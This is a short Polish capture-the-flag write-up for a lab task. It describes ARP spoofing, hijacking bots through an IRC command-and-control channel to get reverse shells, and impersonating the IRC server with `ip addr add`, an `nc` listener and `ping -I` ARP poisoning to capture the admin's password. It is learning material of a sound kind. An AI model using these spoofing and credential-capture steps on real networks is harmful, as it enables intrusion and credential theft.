# Alt-f4 task writeup [Polish]

**NOTE: This was written just for my friends and I didn't have time to polish it, so it is in polish language :P**

### TLDR task info
TLDR:
Nasz ip: 172.30.0.14 (w vpn)

Sa dwa routery:
- 172.30.0.1 - tu my jestesmy podlaczeni oraz bot imp3ac33 czy jakos tak (172.30.0.2 chyba)
- 172.30.20.1 - ten router jest podlaczony do 172.30.0.1 oraz ma w swojej sieci: serwer irca (172.30.20.10), admina irca - lordbaal (172.30.20.2), ktory w /whois widac ze siedzi na kanale #sanctum (gdzie jest flaga) oraz bota impac66 ktory ma ip 172.30.20.3

### Solution
1. Robimyarp spoofing na 172.30.0.1 oraz 172.30.0.2 - bo tylko te hosty widac w naszej sieci (na przyklad przez ettercap)
- dzieki temu wiemy ze istnieje serwer irca na 172.30.20.10, bo bot 172.30.0.2 sie z nim laczy
- nie znamy hasla do irca, ale przez to ze robimy arp spoofing bot 172.30.0.2 rozlacza sie z irca i probuje polaczyc sie ponownie wysylajac haslo `underling`
- na ircu widzimy komunikacje C&C: to znnaczy admin - lordbaal wysyla komendy do impac66 i imp3ac33 - w ten sposob: `+impac66, payload http://172.30.0.2:8000/stats` - i jednoczesnie ten lordbaal hostuje u siebie serwer http gdzie hostuje dla nich payloady
- nie ma zadnych ACL/podpisow payloadow wiec mozemy zrobic reverse shella z obu botow na siebie
- na botach nie ma nic ciekawego

2. Na botach mamy dostep do konfiguracji sieci przez polecenie `ip`

3. Robimy 2 reverse shelle na impac66 (172.30.20.2), dodajemy sobie adres ip irca do interfejsu sieciowego przez `ip addr add 172.30.20.10 dev eth0`; w drugim shellu odpalamy netcata `nc -l -vvv -p 6667` - chcemy "byc serwerem irca" i zrobic zeby baal sie z nami polaczyl

4. Na te chwile mamy taki sam adres ip jak serwer irca ale nikt w sieci o tym nie wie, a w szczegolnosci nie baal

5. impac66 rozlaczy sie wtedy sam z irca, bo wysyla wiadomosci sam do siebie - wznowi wtedy polaczenie do siebie do irca wiec w drugim shellu z nc zobaczymy to polaczenie, musimy je zabic z pierszego shella przez `kill -9 $(pidof nc)` i odpalic na nowo nc

6. Zeby baal laczyl sie do nas a nie do prawdziwego shella robimy arp spoofing poprzez ping: `ping -c 10 -I 172.30.20.10 172.30.20.2` - uwaga `-c 10` dajemy po to zeby wyslac 10 pakietow, a `-I 172.30.20.10` zeby ping wysylal pakiety ICMP z tego adresu ip (podszywamy sie pod serwer irca - zatruwamy tablice arp u baala)

7. jak dobrze trafimy (ewentualnie zabijajac nc jeszcze pare razy i odpalajac na nowo) to baal polaczy sie z nami i wysle nam swoje "uprzywilejowane" haslo irca

8. tutaj usuwamy z impac66 (172.30.20.2) dodatkowy adres ip (172.30.20.10) - przestajemy sie podszywac pod irca i od siebie wchodzimy na serwer irca z nowym haslem (od baala) i wbijamy na #sanctum i mamy flage
